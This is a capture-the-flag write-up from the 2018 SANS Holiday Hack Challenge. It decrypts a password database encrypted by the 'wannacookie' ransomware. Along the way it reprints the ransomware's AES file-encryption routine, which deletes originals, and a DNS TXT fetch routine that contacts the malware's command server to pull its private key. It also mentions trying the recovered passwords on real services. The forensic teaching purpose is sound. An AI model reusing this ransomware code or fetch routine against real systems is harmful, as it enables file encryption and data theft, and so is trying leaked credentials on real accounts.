Question 12: Recover Alabaster's Password
=========================================

| After activating the kill-switch domain in the last question, Alabaster gives you `a zip file <https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip>`_ with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the Vault entry?

Answer: *ED#ED#EED#EF#G#F#G#ABA#BA#B*

Solution
--------

Step 1: Analyse the wannacookie.ps1 code
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The ``forensic_artifacts.zip`` file, mentioned in the question, contained a memory dump and a file called ``alabaster_passwords.elfdb.wannacookie``. We assumed that the file was encrypted by the wannacookie malware that we had been examining. Hence our first step was to examine the code and try to work out how it encrypted files with the hope that we could use this knowledge to decrypt files.

An analysis of wannacookie.ps1 revealed the following:

1. The **wannacookie.ps1** code had the ability to both encrypt and decrypt files. Upon learning this, the problem became easier because we already had the tools (**wannacookie.ps1**) required to decrypt the files.

2. The **enc_dec()** function is called to encrypt/decrypt files. The function is passed three parameters:

  a. an encrption/decryption key
  b. the file name/s
  c. a boolean flag ($false = decrypt, $true = encrypt)


**enc_dec()** calls another function (**Enc_Dec-File()**) to perform the encryption/decryption using a symmetric AES algorithm. This meant that the *same* key was used for both encryption and decryption.

3. The symmetric encryption key is generated using:

.. code-block:: powershell

 $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})

**$Byte_key** creates an array of 16 integers where each integer has a value from 1 to 255. The key also gets stored as **$Hex_key**. **$Hex_key** is a string of 32 characters where each set of two characters is the hexadecimal representation of each integer value in **$Byte_key**. The **B2H()** and **H2B()** functions that are included in **wannacookie.ps1** can be conveniently used to convert between **$Byte_key** and **$Hex_key**.

4. **$Byte_key** gets encrypted using a X509 public key via the **Pub_Key_Enc()** function. The result gets stored in a variable called **$Pub_key_encrypted_Key**. The **$Byte_key** and **$Hex_key** variables are later destroyed. It was later proven that this complicated the decryption process because the symmetric key was no longer in memory (i.e. it was not in the memory dump). We realised that to decrypt the file we would need to find a way to obtain the private key.

5. **$Pub_key_encrypted_Key** is a string with a length of 512 hexadecimal digits.

6. The symmetric key gets hashed using SHA1. The hash has a length of 40 and consists of HEX digits.

Step 2: Obtain the private key
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Based on **wannacookie.ps1** we created the following code to download the RSA key used to encrypt the symmetric key and import it as a X509 certificate. Line 32 exports the key as a DER encoded file (**kringle.cer**).

.. code-block:: powershell
 :linenos:

 function get_over_dns($f) {
    $h = ''
    foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10)-1)) {
        $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings
    }
    return (H2A $h)
 }

 function A2H(){
    Param($a)
    $c = ''
    $b = $a.ToCharArray();
    Foreach ($element in $b) {
        $c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
    }
    return $c -replace ' '
 }

 function H2A() {
    Param($a)
    $outa
    $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_}
    return $outa
 }
 
 $pub_key = [System.Convert]::FromBase64String($(get_over_dns(A2H ("server.crt"))))

 [byte[]]$pub_bytes = $pub_key
 $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
 $cert.Import($pub_bytes)

 Set-Content -Path 'E:\Temp\kringle.cer' -Value $pub_key -Encoding Byte

We hoped that the certifcate would also contain the private key but examining **$cert.value** revealed that the certificate only contained the public key with no associated the private key.

Feeling inspired by something we saw in the **app.js** code from :doc:`Question 8 </objectives/question8>` we substituted ``server.crt`` in the above code with ``server.key``. After working through a few errors we ended up with the following code to obtain the private key. Line 13 exports the private key as a PEM encoded file (**kringleserver.key**).

.. code-block:: powershell
 :linenos:

 function A2H(){
    Param($a)
    $c = ''
    $b = $a.ToCharArray();
    Foreach ($element in $b) {
        $c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
    }
    return $c -replace ' '
 }

 $priv_key = $(get_over_dns(A2H ("server.key")))[1]

 Set-content 'E:\temp\kringleserver.key' -Value $priv_key -Encoding ASCII
 
**$priv_key** was a string representing the private key in PEM format.

Step 3: Create a X509 certificate containing public/private keys
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Instead of trying to work out how to import utilise the private key with the System.Security.Cryptography .NET library, we decided to utilise **OpenSSL**, using the public/private keys that we already had, to create a X509 certifcate containing both private/public keys. Our aim was to later import this certificate using code based on ``wannacookie.ps1`` and decrypt the symmetric encryption key.

To convert the public key to PEM format we used the following command:

.. code-block:: none
 :linenos:

 openssl x509 -inform DER -in E:\temp\kringle.cer -out E:\temp\kringle.pem
 openssl pkcs12 -export -out E:\temp\kringle.pfx -inkey E:\temp\kringleserver.key -in E:\temp\kringle.pem

Line 1 converts the public key from DER (**kringle.cer**) to PEM (**kringle.pem**) format.

Line 2 combines the private and public keys into a PCKS12 encoded certifcate (**kringle.pfx**).

Step 4: Retrieve the encrypted encryption key and the hash of the encryption key
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Before we can utilise the X509 certificate to decrypt the private key we need to retrieve two things from the memory dump:
 1. The encrypted symmetric encryption key
 2. The hash of the symmetric encryption key

We decided to use `Power Dump <https://github.com/chrisjd20/power_dump>`_ to retrieve the information from the memory dump.

.. note::

 **Power Dump** takes a 64 bit Windows 10 powershell process dump made using procdump and retrieves powershell blocks and variables from memory. Basically its strings on steroids with a little extra logic built-in for finding powershell. Only tested and built out right now for/on Windows 10 64 bit Intel.

We started Power Dump using the following command::

 py -2 .\power_dump.py

We used option 1 to load the dump file (**powershell.exe_181109_104716.dmp**). We used option 2 to process the dump file. We then used option 4 to search for stored PowerShell variables.

To find the key we used the following filters derived from the information we found in Part 1::

 matches "^[a-fA-F0-9]+$"
 len == 512

This resulted in one match::

   3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971

To find the hash we used the following filters derived from the information we found in Part 1::

 matches "^[a-fA-F0-9]+$"
 len == 40

This resulted in one match::

 b0e59a5e0f00968856f22cff2d6226697535da5b

Step 5: Use the X509 certifcate to decrypt the symmetric encryption key
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

We used the following code to decrypt the encrypted symmetric encryption key and generate a SHA1 hash of it:

.. code-block:: powershell
 :linenos:

 function H2B {
    param($HX)
    $HX = $HX -split '(..)' | ? { $_ }
    ForEach ($value in $HX){
        [Convert]::ToInt32($value,16)
    }
 }

 function B2H {
    param($DEC)
    $tmp = ''
    ForEach ($value in $DEC){
        $a = "{0:x}" -f [Int]$value
        if ($a.length -eq 1){
            $tmp += '0' + $a
        } else {
            $tmp += $a
        }
    }
    return $tmp
 }

 function Sha1([String] $String) {
    $SB = New-Object System.Text.StringBuilder
        [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{
        [Void]$SB.Append($_.ToString("x2"))
    }
    $SB.ToString()
 }

 function import-pfxbytes {
    param($pfxBytes)
    $pfxPass = 'password'
    $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
    $cert.Import([byte[]]$pfxBytes, $pfxPass,"Exportable,PersistKeySet")
    return $cert
 }

 $pfxBytes = Get-Content -Path "E:\Temp\kringle.pfx" -encoding Byte 

 $cert = import-pfxbytes($pfxBytes)

 $Pub_key_encrypted_Key = '3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971'

 $Byte_pub_key_encrypted_Key = H2B($Pub_key_encrypted_Key)
 $Byte_key = $cert.PrivateKey.Decrypt($Byte_pub_key_encrypted_Key, $true)
 $Hex_key = $(B2H $Byte_key)

 $Key_Hash = $(Sha1 $Hex_key)

 Write-Host The key is $Hex_key
 Write-Host The hash of the key is $Key_Hash

The key in line 43 is the same as the key found in Step 4.

The code produced the following output::

 The key is ``fbcfc121915d99cc20a3d3d5d84f8308``
 The hash of the key is ``b0e59a5e0f00968856f22cff2d6226697535da5b``

The generated hash matched the hash that we found in Step 4. This assured us that we had obtained the correct key.

Step 6: Decrypt the file
^^^^^^^^^^^^^^^^^^^^^^^^

We used the following code to decrypt the file which was stored at ``E:\temp\alabaster_passwords.elfdb.wannacookie``.

.. code-block:: powershell
 :linenos:

 $functions = {
    function Enc_Dec-File($key, $File, $enc_it) {
        [byte[]]$key = $key
        $Suffix = "`.wannacookie"
        [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography')
        [System.Int32]$KeySize = $key.Length*8
        $AESP = New-Object 'System.Security.Cryptography.AesManaged'
        $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AESP.BlockSize = 128
        $AESP.KeySize = $KeySize
        $AESP.Key = $key
        $FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open)
        if ($enc_it) {$DestFile = $File + $Suffix} else {$DestFile = ($File -replace $Suffix)}
        $FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create)
        if ($enc_it) {
            $AESP.GenerateIV()
            $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4)
            $FileSW.Write($AESP.IV, 0, $AESP.IV.Length)
            $Transform = $AESP.CreateEncryptor()
        } else {
            [Byte[]]$LenIV = New-Object Byte[] 4
            $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
            $FileSR.Read($LenIV,  0, 3) | Out-Null
            [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)
            [Byte[]]$IV = New-Object Byte[] $LIV
            $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null
            $FileSR.Read($IV, 0, $LIV) | Out-Null
            $AESP.IV = $IV
            $Transform = $AESP.CreateDecryptor()
        }
        $CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
        [Int]$Count = 0
        [Int]$BlockSzBts = $AESP.BlockSize / 8
        [Byte[]]$Data = New-Object Byte[] $BlockSzBts
        Do
        {
            $Count = $FileSR.Read($Data, 0, $BlockSzBts)
            $CryptoS.Write($Data, 0, $Count)
        }
        While ($Count -gt 0)
        $CryptoS.FlushFinalBlock()
        $CryptoS.Close()
        $FileSR.Close()
        $FileSW.Close()
        Clear-variable -Name "key"
        Remove-Item $File
    }
 }


 function enc_dec {
    param($key, $allfiles, $make_cookie )
    $tcount = 12
    for ( $file=0; $file -lt $allfiles.length; $file++  ) {
        while ($true) {
            $running = @(Get-Job | Where-Object { $_.State -eq 'Running' })
            if ($running.Count -le $tcount) {
                Start-Job  -ScriptBlock {
                    param($key, $File, $true_false)
                    try{
                        Enc_Dec-File $key $File $true_false
                    } catch {
                        $_.Exception.Message | Out-String | Out-File $('E:\Temp'+'\ps_log.txt') -append
                    }
                } -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions
                break
            } else {
                Start-Sleep -m 200
                continue
            }
        }
    }
 }

 function H2B {
    param($HX)
    $HX = $HX -split '(..)' | ? { $_ }
    ForEach ($value in $HX){
        [Convert]::ToInt32($value,16)
    }
 }

 $akey = 'fbcfc121915d99cc20a3d3d5d84f8308'

 $akey = $(H2B $akey)
 [array]$allcookies = $(Get-ChildItem -Path "E:\Temp" -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
 enc_dec $akey $allcookies $false

The result of running this code was the unencrypted file called ``alabaster_passwords.elfdb``.

Step 7: Extract the vault password
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The next step was to try and work out what type of file the ``alabaster_passwords.elfdb`` was. We found the simplest way to work this out was to open the file in a text editor and look at the initial characters. This provided the string ``SQLite format 3``. 

.. note::
 A quick examination of the file using a text editor revealed a couple of passwords but the parts of the file that were important consisted of binary data.

We didn't have SQLite handily available so we simply opened the file in an online `SQLite application <https://sqliteonline.com>`_.

The database showing the contents of the passwords table is shown in the following figure. The password for the vault has been highlighted.

.. image:: /images/alabaster_passwords.elfdb.png

.. note::
 We tried using the passwords with online services such as NetFlix, but found out that the accounts did not exist. Perhaps Santa has his own regionalised versions of these online services.
